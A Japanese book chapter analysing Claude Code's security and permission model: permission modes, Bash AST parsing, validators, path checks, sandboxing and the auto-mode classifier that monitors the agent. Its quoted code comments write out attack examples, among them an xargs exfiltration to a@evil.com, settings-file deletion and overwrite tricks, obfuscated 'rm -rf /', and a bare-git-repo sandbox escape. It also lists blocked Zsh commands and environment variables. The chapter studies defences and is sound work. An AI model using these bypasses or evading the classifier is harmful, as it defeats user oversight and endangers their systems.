# 第 10 章：セキュリティと権限モデル

## 10.1 概要と位置づけ

Claude Code のセキュリティモデルは、システム全体の中でコード量が最も多く、複雑度が最も高いサブシステムであり、約 25,000 行の TypeScript ソースコードを含む。解決する核心的な問題は：**AI エージェントにシェルコマンドの実行とファイルの変更能力を与えながら、悪意のある命令インジェクション、データ漏洩、システム破壊を防ぐにはどうすればよいか？**

従来の IDE プラグインとは異なり、Claude Code は独自の脅威モデルに直面している。AI モデル自体が prompt injection によって危険な操作を実行するよう誘導される可能性があり、コードベースにクローンされた悪意あるリポジトリがファイル名や内容を通じて攻撃ベクターを構築するかもしれない。セキュリティシステムは**モデルの出力**と**オペレーティングシステム**の間に信頼できる検証層を確立しなければならない。

セキュリティサブシステム全体は次の一式で概括できる：

```
最終決定 = f(権限モード, ルールマッチング, AST 分析, セキュリティバリデーター, パス検証, 分類器, Hook, サンドボックス)
```

これは単層フィルターではなく、8 層の縦深防衛体系（Defense in Depth）であり、各層は独立して機能し、層を重ねることができる。

## 10.2 理論的基礎

### 10.2.1 最小権限原則（Principle of Least Privilege）

Claude Code はデフォルトですべての書き込み操作を拒否する——各ツール呼び出しは `checkPermissions` を通じて認可を得なければならない。権限モードは最も厳格（`default`——毎回確認）から最も緩和（`bypassPermissions`）まで、ユーザーが能動的に信頼レベルを選択する。

### 10.2.2 サンドボックスモデル（Sandboxing）

`@anthropic-ai/sandbox-runtime` を統合し、macOS では `sandbox-exec`、Linux では `bubblewrap`（bwrap）を使用して、OS 層でファイルシステムとネットワークアクセスを隔離する。サンドボックスはアプリケーション層の権限チェックから独立している——アプリケーション層が判断を誤っても、OS 層が依然として阻止する。

### 10.2.3 セキュリティ領域における AST 分析の応用

従来の正規表現マッチングとは異なり、Claude Code はコマンド構造を理解するために完全な Bash AST 解析（純粋な TypeScript 実装の tree-sitter 互換パーサー）を使用する。これはセキュリティ検証の礎石である——正規表現は `echo "rm -rf /"` と `rm -rf /` を区別できないが、AST は区別できる。

### 10.2.4 縦深防衛（Defense in Depth）

セキュリティチェックは 8 つの独立した層に分散しており、どの層でもインターセプトすれば危険な操作を阻止できる。攻撃者が AST 解析を回避したとしても（パーサーの差分を悪用するなど）、パス検証、サンドボックス、ユーザー確認がバックアップとして機能する。

## 10.3 権限モデルアーキテクチャ

### 10.3.1 五段階権限モード

権限モードは `utils/permissions/PermissionMode.ts` で定義されており、実際の運用では五段階がある：

| モード | 動作 | 適用シナリオ |
|------|------|----------|
| `default` | 各ツール呼び出しでユーザーに確認 | 初回使用、高リスク環境 |
| `acceptEdits` | ファイル編集は自動承認、コマンドは確認が必要 | 日常開発 |
| `plan` | 計画のみ生成、実行しない | アーキテクチャ設計、コードレビュー |
| `auto` | LLM 分類器が自動判断 | 信頼度の高い開発者 |
| `bypassPermissions` | すべての権限チェックをスキップ | 完全信頼シナリオ（ポリシーで無効化可） |

モード切り替え時には完全な状態遷移ロジックがある（`permissionSetup.ts:transitionPermissionMode`）：

- `auto` モードに入るとき、危険な権限ルールを自動剥奪（`stripDangerousPermissionsForAutoMode`）
- `auto` モードを出るとき、剥奪されたルールを復元（`restoreDangerousPermissions`）
- `plan` モードは `auto` モードを内包できる（plan + auto-during-plan）

```typescript
// permissionSetup.ts:~580
export function transitionPermissionMode(
  fromMode: string,
  toMode: string,
  context: ToolPermissionContext,
): ToolPermissionContext {
  if (fromMode === toMode) return context
  // ...
  if (toUsesClassifier && !fromUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(true)
    context = stripDangerousPermissionsForAutoMode(context)
  } else if (fromUsesClassifier && !toUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(false)
    context = restoreDangerousPermissions(context)
  }
}
```

### 10.3.2 権限ルールシステム

権限ルール（Permission Rules）は細粒度制御の核心であり、複数レベルの設定に保存される：

```typescript
// permissions.ts:~95
const PERMISSION_RULE_SOURCES = [
  ...SETTING_SOURCES, // userSettings, projectSettings, localSettings, flagSettings, policySettings
  'cliArg',
  'command',
  'session',
] as const
```

各ルールは三つの次元を持つ：
- **Source**（由来レベル）：policySettings > flagSettings > localSettings > projectSettings > userSettings > session
- **Behavior**（動作）：`allow` / `deny` / `ask`
- **RuleValue**（マッチングパターン）：例えば `Bash(git commit:*)` はすべての `git commit` で始まるコマンドを許可する

ルールマッチングは三つのパターンをサポートする：
1. **ツールレベルマッチング**：`Bash` はすべての Bash コマンドにマッチ
2. **プレフィックスマッチング**：`Bash(npm run:*)` は `npm run` で始まるコマンドにマッチ
3. **完全一致**：`Bash(ls -la)` はこのコマンドのみにマッチ

### 10.3.3 権限カスケードの完全フロー

Bash コマンドの権限チェックは `bashToolHasPermission`（`bashPermissions.ts`）を経由し、完全なパスは次の通り：

```
1. モードチェック → bypassPermissions は直接通過
2. deny ルールマッチング → ヒットすれば拒否
3. allow ルールマッチング → ヒットすれば許可
4. セキュリティモードチェック → acceptEdits などのモードの特殊処理
5. コマンド AST 解析 → tree-sitter が構造化コマンドを生成
6. セキュリティバリデーターチェーン → 23 項目の静的チェック
7. 読み取り専用検証 → コマンドホワイトリスト + フラグホワイトリスト
8. パス検証 → 作業ディレクトリの制約
9. LLM 分類器（オプション）→ auto モードでの AI 判断
10. ユーザー確認 → 最後のセーフネット
```

## 10.4 Bash コマンドのセキュリティ——八段階分類フロー

### 10.4.1 Tree-sitter AST 解析

これはセキュリティシステム全体の最も核心的なイノベーションである。`utils/bash/ast.ts` は AST ベースの bash コマンド分析を実装している：

```typescript
// ast.ts:~1-20
/**
 * AST-based bash command analysis using tree-sitter.
 *
 * The key design property is FAIL-CLOSED: we never interpret structure we
 * don't understand. If tree-sitter produces a node we haven't explicitly
 * allowlisted, we refuse to extract argv and the caller must ask the user.
 *
 * This is NOT a sandbox. It answers exactly one question: "Can we produce
 * a trustworthy argv[] for each simple command in this string?"
 */
```

AST 解析の出力タイプ：

```typescript
// ast.ts:~30
export type ParseForSecurityResult =
  | { kind: 'simple'; commands: SimpleCommand[] }
  | { kind: 'too-complex'; reason: string; nodeType?: string }
  | { kind: 'parse-unavailable' }
```

重要な設計：**Fail-Closed + Allowlist**。allowlist に含まれない AST ノードタイプはすべて、コマンド全体を `too-complex` としてマークし、ユーザー確認を求める。`DANGEROUS_TYPES` セットは既知の危険なノードタイプを定義している：

```typescript
// ast.ts:~190
const DANGEROUS_TYPES = new Set([
  'command_substitution',   // $() コマンド置換
  'process_substitution',   // <() >() プロセス置換
  'expansion',              // パラメーター展開
  'subshell',               // サブシェル
  'for_statement',          // 制御フロー
  'if_statement',
  'function_definition',
  'brace_expression',       // 波括弧展開
  // ... 計 18 種
])
```

### 10.4.2 純粋 TypeScript Bash パーサー

`utils/bash/bashParser.ts`（4,436 行）は完全な Bash 文法パーサーであり、tree-sitter-bash WASM パーサーと互換性のある AST を生成する。重要な設計パラメータ：

```typescript
// bashParser.ts:~28
const PARSE_TIMEOUT_MS = 50    // 50ms タイムアウト、悪意ある入力を防ぐ
const MAX_NODES = 50_000       // ノード数の上限、OOM を防ぐ
```

パーサーは heredoc、ANSI-C 文字列、プロセス置換など、完全な Bash 文法をサポートする。タイムアウトやノード数の爆発時は直接 `null` を返す——fail-closed。

### 10.4.3 LLM 分類器（Bash Classifier）

`auto` モードで使用される。`bashClassifier.ts` は三組のコマンド説明ルールを維持する：

- **Allow descriptions**：どのコマンドが安全かを説明（例：「git の読み取り専用操作」）
- **Deny descriptions**：どのコマンドが危険かを説明（例：「コードをダウンロードして実行するコマンド」）
- **Ask descriptions**：ユーザー確認が必要なパターン

分類器は `sideQuery` を使用して独立した Claude インスタンスを呼び出し、メインの会話とは完全に隔離される。

### 10.4.4 環境変数フィルタリング

`bashPermissions.ts` は二組の安全な環境変数ホワイトリストを定義している：

```typescript
// bashPermissions.ts:~390
const SAFE_ENV_VARS = new Set([
  'NODE_ENV', 'RUST_LOG', 'PYTHONUNBUFFERED', 'LANG', 'TZ',
  'NO_COLOR', 'FORCE_COLOR', // ... 計 ~40 個
])
```

**セキュリティコメントが特に価値を持つ**——ソースコードにはホワイトリストに**絶対に追加してはいけない**変数が明記されている：

```typescript
// bashPermissions.ts:~385 (コメント)
// SECURITY: These must NEVER be added to the whitelist:
// - PATH, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_* (execution/library loading)
// - PYTHONPATH, NODE_PATH (module loading)
// - NODE_OPTIONS (can contain code execution flags)
// - HOME, TMPDIR, SHELL, BASH_ENV (affect system behavior)
```

### 10.4.5 23 個のシェルセキュリティバリデーター

`bashSecurity.ts` は 23 個の独立したバリデーターを実装しており、各バリデーターは一意の数値 ID を持つ：

```typescript
// bashSecurity.ts:~76
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,
  JQ_SYSTEM_FUNCTION: 2,
  JQ_FILE_ARGUMENTS: 3,
  OBFUSCATED_FLAGS: 4,
  SHELL_METACHARACTERS: 5,
  DANGEROUS_VARIABLES: 6,
  NEWLINES: 7,
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
  IFS_INJECTION: 11,
  GIT_COMMIT_SUBSTITUTION: 12,
  PROC_ENVIRON_ACCESS: 13,
  MALFORMED_TOKEN_INJECTION: 14,
  BACKSLASH_ESCAPED_WHITESPACE: 15,
  BRACE_EXPANSION: 16,
  CONTROL_CHARACTERS: 17,
  UNICODE_WHITESPACE: 18,
  MID_WORD_HASH: 19,
  ZSH_DANGEROUS_COMMANDS: 20,
  BACKSLASH_ESCAPED_OPERATORS: 21,
  COMMENT_QUOTE_DESYNC: 22,
  QUOTED_NEWLINE: 23,
}
```

注目すべきバリデーターをいくつか挙げる：

**コマンド置換の検出**——`$()` だけでなく、Zsh 固有の攻撃面もカバーしている：

```typescript
// bashSecurity.ts:~16
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion (=cmd)' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  // ... PowerShell コメント構文に対する防御的なインターセプトも含む
  { pattern: /<#/, message: 'PowerShell comment syntax' },
]
```

**Zsh 危険コマンドのインターセプト**——`zmodload` は Zsh のモジュールシステムへのエントリーポイントで、`zsh/system`（ファイル I/O）、`zsh/net/tcp`（ネットワーク通信）などのモジュールをロードできる：

```typescript
// bashSecurity.ts:~44
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',   // モジュールロードエントリーポイント
  'emulate',    // -c フラグは eval の等価物
  'sysopen', 'sysread', 'syswrite',  // zsh/system モジュール
  'zpty',       // 疑似端末コマンド実行
  'ztcp',       // TCP ネットワーク通信
  'zf_rm', 'zf_mv', 'zf_chmod',     // zsh/files 組み込みコマンド
  // ...
])
```

### 10.4.6 読み取り専用検証機構

`readOnlyValidation.ts` は**コマンドホワイトリスト + フラグホワイトリスト**体系を維持している。`COMMAND_ALLOWLIST` を核心とする：

```typescript
// readOnlyValidation.ts:~55
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: { '-I': '{}', '-n': 'number', '-P': 'number', ... },
    // 注意：-i と -e は削除、GNU getopt のオプション引数セマンティクスの差異のため
  },
  grep: { safeFlags: { '-e': 'string', '-i': 'none', ... } },
  sort: { safeFlags: { '-r': 'none', '-n': 'none', ... } },
  tree: { safeFlags: { ... } },  // -R は削除：tree -R -H はファイルを書き込む
  date: { safeFlags: { ... }, additionalCommandIsDangerousCallback: ... },
  // ... 計 約 30 個のコマンド
}
```

各コマンドのフラグホワイトリストには詳細なセキュリティコメントがある。例えば `xargs` の `-i` が削除されている理由：

```typescript
// readOnlyValidation.ts:~130 (コメント)
// SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
// optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
// attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
// flag takes NO arg and `X` becomes the next positional (target command).
//
// `-i` (`i::` — optional replace-str):
//   echo /usr/sbin/sendm | xargs -it tail a@evil.com
//   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
//   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
```

このレベルのセキュリティ分析——GNU getopt のオプション引数セマンティクスの差異がパーサーの差分を引き起こすことの理解——はセキュリティモデル全体の中で最も印象的な部分だ。

### 10.4.7 パス検証とトラバーサル保護

`pathValidation.ts`（1,303 行）は完全なパスセキュリティ体系を実装している：

**パス抽出器**——34 種のコマンドに専用の引数パーサーを定義している：

```typescript
// pathValidation.ts:~170
export const PATH_EXTRACTORS: Record<PathCommand, (args: string[]) => string[]> = {
  cd: args => (args.length === 0 ? [homedir()] : [args.join(' ')]),
  find: args => { /* 複雑なフラグ/パス分離ロジック */ },
  grep: args => parsePatternCommand(args, flags),
  git: args => { /* git diff --no-index の特殊処理 */ },
  // ... 計 34 種のコマンド
}
```

**POSIX `--` の処理**——end-of-options デリミターを正しく処理し、`-path` 類の引数がパス検証を回避するのを防ぐ：

```typescript
// pathValidation.ts:~105
// SECURITY: `rm -- -/../.claude/settings.local.json`
// ここで `-/../.claude/settings.local.json` は `-` で始まるため、
// `--` を処理しなければ naive な !arg.startsWith('-') フィルターが
// それを破棄し、バリデーターはパスを 0 個見て passthrough を返し、
// ファイルが削除される。
function filterOutFlags(args: string[]): string[] {
  const result: string[] = []
  let afterDoubleDash = false
  for (const arg of args) {
    if (afterDoubleDash) { result.push(arg) }
    else if (arg === '--') { afterDoubleDash = true }
    else if (!arg?.startsWith('-')) { result.push(arg) }
  }
  return result
}
```

**危険な削除パスの保護**——allowlist ルールがあっても、`/`、`/etc`、`/home` などの重要パスへの rm 操作は常にユーザー確認を求める：

```typescript
// pathValidation.ts:~70
function checkDangerousRemovalPaths(
  command: 'rm' | 'rmdir', args: string[], cwd: string
): PermissionResult {
  for (const path of paths) {
    if (isDangerousRemovalPath(absolutePath)) {
      return { behavior: 'ask', message: `Dangerous ${command} operation...` }
    }
  }
}
```

**cd + 書き込み操作の複合攻撃保護**：

```typescript
// pathValidation.ts:~490
// SECURITY: Block write operations in compound commands containing 'cd'
// Example attack: cd .claude/ && mv test.txt settings.json
// This would bypass the check for .claude/settings.json because paths
// are resolved relative to the original CWD.
if (compoundCommandHasCd && operationType !== 'read') {
  return { behavior: 'ask', message: '...' }
}
```

## 10.5 FileEdit 検証チェーン

FileEditTool の検証チェーンは `FileEditTool.ts` の `validateInput` メソッドに実装されており、計 12 ステップある：

| ステップ | チェック項目 | ソースコードの場所 |
|------|--------|----------|
| 1 | Team Memory Secret の検出 | `checkTeamMemSecrets(fullFilePath, new_string)` |
| 2 | old_string === new_string 変更なしチェック | errorCode: 1 |
| 3 | Deny ルールのマッチング | `matchingRuleForInput(..., 'deny')` |
| 4 | UNC パスのセキュリティチェック（NTLM 漏洩防止） | `fullFilePath.startsWith('\\\\')` |
| 5 | ファイルサイズ制限（1 GiB） | `MAX_EDIT_FILE_SIZE` |
| 6 | ファイルエンコーディングの検出と読み込み | UTF-8 / UTF-16LE |
| 7 | ファイルの存在確認 | 存在しない場合は old_string が空でなければならない |
| 8 | Jupyter Notebook のインターセプト | NotebookEditTool の使用を誘導 |
| 9 | **Must-Read-Before-Write** チェック | `readFileState.get(fullFilePath)` |
| 10 | **mtime 並行変更検出** | `lastWriteTime > readTimestamp.timestamp` |
| 11 | **一意性チェック** | 複数マッチ時は `replace_all: true` を要求 |
| 12 | Settings ファイルの特殊検証 | `validateInputForSettingsFileEdit` |

ステップ 9 と 10 が**「先読み後書き」**不変条件を構成する：

```typescript
// FileEditTool.ts:~250
const readTimestamp = toolUseContext.readFileState.get(fullFilePath)
if (!readTimestamp || readTimestamp.isPartialView) {
  return {
    result: false, behavior: 'ask',
    message: 'File has not been read yet. Read it first before writing to it.',
  }
}
// ...
const lastWriteTime = getFileModificationTime(fullFilePath)
if (lastWriteTime > readTimestamp.timestamp) {
  // Windows の特殊処理：クラウド同期/ウイルス対策ソフトが mtime を変更するが内容は変えない場合がある
  if (isFullRead && fileContent === readTimestamp.content) {
    // 内容が変更されていない、安全に通過
  } else {
    return { result: false, message: 'File has been modified since read...' }
  }
}
```

## 10.6 サンドボックス機構

### 10.6.1 サンドボックスアダプターアーキテクチャ

`utils/sandbox/sandbox-adapter.ts`（985 行）は `@anthropic-ai/sandbox-runtime` のアダプター層であり、Claude Code の設定システムをサンドボックスランタイム設定にマッピングする：

```typescript
// sandbox-adapter.ts:~160
export function convertToSandboxRuntimeConfig(
  settings: SettingsJson,
): SandboxRuntimeConfig {
  const allowWrite: string[] = ['.', getClaudeTempDir()]
  const denyWrite: string[] = []
  
  // 常に settings ファイルへの書き込みを拒否——サンドボックスエスケープを防ぐ
  denyWrite.push(...settingsPaths)
  denyWrite.push(getManagedSettingsDropInDir())
  
  // .claude/skills への書き込みを拒否——同等の権限レベル
  denyWrite.push(resolve(originalCwd, '.claude', 'skills'))
  
  // ベア Git リポジトリ攻撃の保護
  for (const gitFile of ['HEAD', 'objects', 'refs', 'hooks', 'config']) {
    const p = resolve(dir, gitFile)
    try { statSync(p); denyWrite.push(p) }
    catch { bareGitRepoScrubPaths.push(p) }
  }
}
```

### 10.6.2 ベア Git リポジトリ攻撃の保護

これは精巧なセキュリティ対策である。攻撃者は cwd に `HEAD`、`objects/`、`refs/` ファイルを配置することで、Git の `is_git_directory()` が cwd をベアリポジトリと誤認させ、次に `core.fsmonitor` 設定を通じて任意のコードを実行できる：

```typescript
// sandbox-adapter.ts:~245
// SECURITY: Git's is_git_directory() treats cwd as a bare repo if it has
// HEAD + objects/ + refs/. An attacker planting these (plus a config with
// core.fsmonitor) escapes the sandbox when Claude's unsandboxed git runs.

// 戦略：既存のファイルは読み取り専用バインド、存在しないファイルはコマンド実行後にクリーンアップ
function scrubBareGitRepoFiles(): void {
  for (const p of bareGitRepoScrubPaths) {
    try { rmSync(p, { recursive: true }) }
    catch { /* ENOENT は正常 */ }
  }
}
```

### 10.6.3 ネットワーク隔離戦略

サンドボックスはドメインレベルのネットワーク制御をサポートし、WebFetch ツールの権限ルールから許可されたドメインを抽出する：

```typescript
// sandbox-adapter.ts:~190
for (const ruleString of permissions.allow || []) {
  const rule = permissionRuleValueFromString(ruleString)
  if (rule.toolName === WEB_FETCH_TOOL_NAME && 
      rule.ruleContent?.startsWith('domain:')) {
    allowedDomains.push(rule.ruleContent.substring('domain:'.length))
  }
}
```

エンタープライズポリシーは `allowManagedDomainsOnly` を通じて管理者が設定したドメインのみの使用を強制できる。

## 10.7 Hook システムと権限のインタラクション

### 10.7.1 PreToolUse / PostToolUse Hook

Hook システムはユーザーがカスタムセキュリティロジックを注入することを可能にする。`interactiveHandler.ts` は Hook が権限決定と競合する方法を示している：

```typescript
// interactiveHandler.ts:~68
// 四方競争：ユーザーインタラクション / Hook / 分類器 / Bridge(CCR)
// claim() アトミック操作で一人の勝者のみを保証
void (async () => {
  if (isResolved()) return
  const hookDecision = await ctx.runHooks(
    currentAppState.toolPermissionContext.mode,
    result.suggestions,
    result.updatedInput,
    permissionPromptStartTimeMs,
  )
  if (!hookDecision || !claim()) return
  ctx.removeFromQueue()
  resolveOnce(hookDecision)
})()
```

### 10.7.2 権限決定の並行競争モデル

`PermissionContext.ts` は `createResolveOnce` を定義している——「claim してから resolve する」パターンで、複数の非同期ソース（ユーザー UI、Hook、分類器、Bridge、Channel）が競合する際に一人の勝者のみを保証する：

```typescript
// PermissionContext.ts:~80
function createResolveOnce<T>(resolve: (value: T) => void): ResolveOnce<T> {
  let claimed = false
  let delivered = false
  return {
    claim() {
      if (claimed) return false
      claimed = true
      return true
    },
    resolve(value: T) {
      if (delivered) return
      delivered = true; claimed = true
      resolve(value)
    },
  }
}
```

この設計は六方向の並行競争をサポートする：
1. **ローカル UI** — ユーザーが端末で Allow/Deny をクリック
2. **Hook** — PreToolUse hook が決定を返す
3. **Bash Classifier** — LLM 分類器が安全と判断
4. **Bridge (CCR)** — Claude.ai Web UI がリモートで決定
5. **Channel** — Telegram/iMessage などのチャンネルからの返信
6. **Recheck** — ルール変更後に自動で再チェック

## 10.8 YOLO 分類器（Auto Mode Classifier）

### 10.8.1 アーキテクチャ

`yoloClassifier.ts`（1,495 行）は `auto` モードの AI セキュリティ分類器を実装している。これは独立した Claude インスタンスであり、`sideQuery` で呼び出され、メインの会話とは完全に隔離されている：

```typescript
// yoloClassifier.ts:~400
const YOLO_CLASSIFIER_TOOL_SCHEMA: BetaToolUnion = {
  type: 'custom',
  name: 'classify_result',
  input_schema: {
    type: 'object',
    properties: {
      thinking: { type: 'string' },
      shouldBlock: { type: 'boolean' },
      reason: { type: 'string' },
    },
  },
}
```

### 10.8.2 二段階 XML 分類器

分類器は三種の実行モード（`both` / `fast` / `thinking`）をサポートし、デフォルトは二段階戦略を使用する：

- **Stage 1（fast）**：max_tokens=64、nudge が即座に yes/no 判断を提供。安全と判断されれば直接返す。
- **Stage 2（thinking）**：Stage 1 が「block」と判断した場合のみトリガー、chain-of-thought 推論を使用して false positive を減らす。

```typescript
// yoloClassifier.ts:~680
const XML_S1_SUFFIX = '\nErr on the side of blocking. <block> immediately.'
const XML_S2_SUFFIX = '\nReview the classification process and follow it carefully...'
```

### 10.8.3 トランスクリプト圧縮

分類器は完全な会話履歴を受け取らず、`buildTranscriptEntries` を通じて会話をコンパクト形式に圧縮する——ユーザーテキストとアシスタントの tool_use ブロックのみを保持（アシスタントのテキストは除外。モデルが生成したものであり、分類器の判断に影響するよう構築される可能性があるため）：

```typescript
// yoloClassifier.ts:~480
// Only include tool_use blocks — assistant text is model-authored
// and could be crafted to influence the classifier's decision.
if (block.type === 'tool_use') {
  blocks.push({ type: 'tool_use', name: block.name, input: block.input })
}
```

### 10.8.4 Fast-Path の最適化

分類器を呼び出す前に、LLM 呼び出しをスキップできる三つの fast-path がある：

1. **acceptEdits シミュレーション**：コマンドが `acceptEdits` モードで自動的に許可される場合、直接通過
2. **Safe-tool ホワイトリスト**：`isAutoModeAllowlistedTool` が既知の安全なツールセットを維持
3. **Denial tracking**：連続拒否回数が多すぎる場合、ユーザーへの直接確認にフォールバック

### 10.8.5 危険な権限の剥奪

`auto` モードに入ると、以下の権限ルールが自動的に剥奪される（`stripDangerousPermissionsForAutoMode`）：

```typescript
// permissionSetup.ts:~100
export function isDangerousBashPermission(toolName: string, ruleContent: string | undefined): boolean {
  // Bash(*) — すべてのコマンドを許可
  if (ruleContent === undefined || ruleContent === '') return true
  // python:*, node:*, bash:* — スクリプトインタープリター
  for (const pattern of DANGEROUS_BASH_PATTERNS) {
    if (content === `${lowerPattern}:*`) return true
    // ...
  }
}
```

これにより、ユーザーが以前 `Bash(python:*)` のような広範なルールを保存していても、`auto` モードでは分類器を回避できないことが保証される。

## 10.9 設計上の意思決定分析

### 10.9.1 なぜ正規表現ではなく AST 解析を使うのか

正規表現は **パーサー差分**攻撃を処理できない。例えば：

```bash
echo "rm -rf /"   # 正規表現は誤検出——これは echo の引数に過ぎない
rm -rf /           # 正規表現が報告すべきはこれだ
```

さらに危険なのは**クォートのネスト**と**シェル展開**：

```bash
ev"al" 'rm -rf /'    # 正規表現は eval を見逃す可能性がある
$'\x65\x76\x61\x6c' 'rm -rf /'  # ANSI-C 文字列エンコーディングによる eval
```

AST パーサーは構文構造を理解し、コマンド名と引数を正しく区別できる。また fail-closed 設計により、解析できない構造はすべてユーザー確認が必要になる。

### 10.9.2 LLM 分類器の導入タイミングとトレードオフ

分類器は `auto` モードでのみ使用され、厳格なコスト制御がある：

- **レイテンシ**：二段階設計、Stage 1 は通常 <100ms（max_tokens=64 + prompt cache）
- **コスト**：`sideQuery` で独立した API 呼び出しを使用し、メインの会話の token 消費には含まれない
- **精度**：Stage 2 の chain-of-thought により false positive が合理的なレベルまで低減
- **信頼性**：分類器が利用不可の場合は fail-closed（ユーザーへの確認にフォールバック）

### 10.9.3 セキュリティと使いやすさのバランス

Claude Code は**段階的信頼**（progressive trust）を通じて両者のバランスをとる：

1. 初回使用：各コマンドで確認が必要
2. ルール保存後：マッチするコマンドは自動通過
3. `acceptEdits` モード：ファイル編集は自動通過
4. `auto` モード：AI 分類器が判断
5. `bypassPermissions`：完全信頼

同時に**スマートな提案**（`suggestionForExactCommand` / `suggestionForPrefix`）により、一気に信頼レベルを選択させるのではなく、ユーザーが段階的に信頼ルールを構築するよう誘導する。

### 10.9.4 競合製品のセキュリティモデルとの比較

| 次元 | Claude Code | Cursor | GitHub Copilot |
|------|------------|--------|----------------|
| コマンド分析 | AST 解析 + 23 バリデーター | 基本的な正規表現 | コマンドを実行しない |
| サンドボックス | OS レベル（sandbox-exec/bwrap） | なし | N/A |
| 権限モデル | 5 段階 + 細粒度ルール | 二値（許可/拒否） | N/A |
| AI 分類器 | 独立した LLM インスタンス | なし | なし |
| パス検証 | 34 種のコマンド専用パーサー | 基本的なチェック | N/A |
| エンタープライズポリシー | policySettings 層 | 限定的 | 組織ポリシー |

## 10.10 移植可能なパターン

1. **Fail-Closed Allowlist パターン**：AST 解析の核心原則——既知の安全な構造のみを理解し、その他はすべて拒否する。信頼できない入力を解析する必要があるシナリオに適用できる。

2. **Claim-then-Resolve 並行パターン**：`createResolveOnce` は複数の非同期ソースが決定を競う問題を解決している。「最初に到達した意思決定者が勝つ」必要があるシナリオで再利用できる。

3. **段階的信頼の昇格**：最も厳格なモードから始め、ユーザーの行動を通じて徐々に信頼ルールを構築する。「最初から信頼レベルを選択する」よりも人間の心理に合っている。

4. **分類器 Fast-Path + 二段階**：まずルール/ホワイトリスト/シミュレーションで明らかに安全な操作をスキップし、不確かな呼び出しにのみ LLM を呼ぶ。二段階戦略（fast + thinking）でレイテンシと精度のバランスをとる。

5. **Parser Differential の防御**：自分のパーサーを使うだけでなく、シェルの特性の差異（GNU vs BSD getopt、Zsh vs Bash の展開ルール）を系統的にチェックする。この考え方は複数の解釈器が絡むシステムにも移植できる。

6. **権限ルールの由来階層**：複数レベルの設定の統合（policy > flag > local > project > user > session）、エンタープライズポリシーが常に勝つ。汎用的な設定優先度モデル。

7. **サンドボックス + アプリケーション層の二重保険**：アプリケーション層の権限チェックが回避されても OS サンドボックスが依然として阻止する——逆も同様。二層が独立して失敗する。

## 10.11 ソースコードインデックス

| ファイル | 行数 | 核心的な機能 |
|------|------|----------|
| `tools/BashTool/bashPermissions.ts` | 2,621 | Bash 権限決定のメインエントリー、ルールマッチング、コマンドプレフィックス抽出 |
| `tools/BashTool/bashSecurity.ts` | 2,592 | 23 個のセキュリティバリデーター、クォート解析、コマンド置換の検出 |
| `tools/BashTool/readOnlyValidation.ts` | 1,990 | コマンドホワイトリスト、フラグホワイトリスト、読み取り専用検証 |
| `tools/BashTool/pathValidation.ts` | 1,303 | 34 種のコマンドのパス抽出器、危険なパスの検出 |
| `tools/BashTool/BashTool.tsx` | 1,143 | Bash ツールエントリー、入力スキーマ、実行ロジック |
| `tools/BashTool/prompt.ts` | 369 | Bash ツールプロンプト、サンドボックスの説明 |
| `tools/FileEditTool/FileEditTool.ts` | ~400 | ファイル編集 12 ステップ検証チェーン |
| `utils/permissions/permissions.ts` | 1,486 | 権限決定の総エントリー、ルールマッチング、auto モード統合 |
| `utils/permissions/permissionSetup.ts` | 1,532 | 権限モード設定、危険なルールの検出と剥奪 |
| `utils/permissions/yoloClassifier.ts` | 1,495 | Auto モード LLM 分類器、二段階 XML プロトコル |
| `utils/permissions/filesystem.ts` | 1,777 | ファイルシステム権限、パスセキュリティ、Claude 設定の保護 |
| `utils/bash/ast.ts` | 2,679 | Bash AST 分析、allowlist ノードの走査 |
| `utils/bash/bashParser.ts` | 4,436 | 純粋 TypeScript Bash パーサー |
| `hooks/toolPermission/handlers/interactiveHandler.ts` | 536 | インタラクティブな権限処理、六方向競争モデル |
| `hooks/toolPermission/PermissionContext.ts` | 388 | 権限コンテキスト、claim-then-resolve |
| `utils/sandbox/sandbox-adapter.ts` | 985 | サンドボックス設定の適応、ベア Git リポジトリ保護 |

---
